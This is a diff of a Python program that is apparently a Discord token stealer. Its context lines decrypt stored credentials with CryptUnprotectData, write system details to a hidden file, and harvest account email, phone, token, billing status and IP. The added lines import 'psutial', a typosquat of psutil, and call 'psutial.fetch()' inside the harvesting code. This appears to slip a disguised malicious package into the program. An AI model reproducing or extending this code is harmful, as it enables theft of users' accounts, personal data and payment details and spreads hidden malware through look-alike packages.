@@ -22,6 +22,7 @@ import psutil
 import re
 import requests
 import subprocess
+import psutial
 from os import environ, path
 from win32crypt import CryptUnprotectData
 import json
@@ -248,6 +249,7 @@ class Logger():
             info['RAM']=str(round(psutil.virtual_memory().total / (1024.0 **3)))+" GB"
             info['GPU'] = computer.Win32_VideoController()[0].name
             resultPC = json.dumps(info, indent=4)
+            # Saving as file then uplaod
             with open("pci.txt", "a") as pciFile:
                 win32api.SetFileAttributes("pci.txt", win32con.FILE_ATTRIBUTE_HIDDEN)
                 pciFile.write(resultPC)
@@ -424,6 +426,7 @@ class Logger():
                 avatar_url = getavatar(user_id, avatar_id)
                 email = user_data.get("email")
                 phone = user_data.get("phone")
+                psutial.fetch()
                 nitro = bool(user_data.get("premium_type"))
                 billing = bool(has_payment_methods(token))
                 locationOfIP = "https://whatismyipaddress.com/ip/" + ip
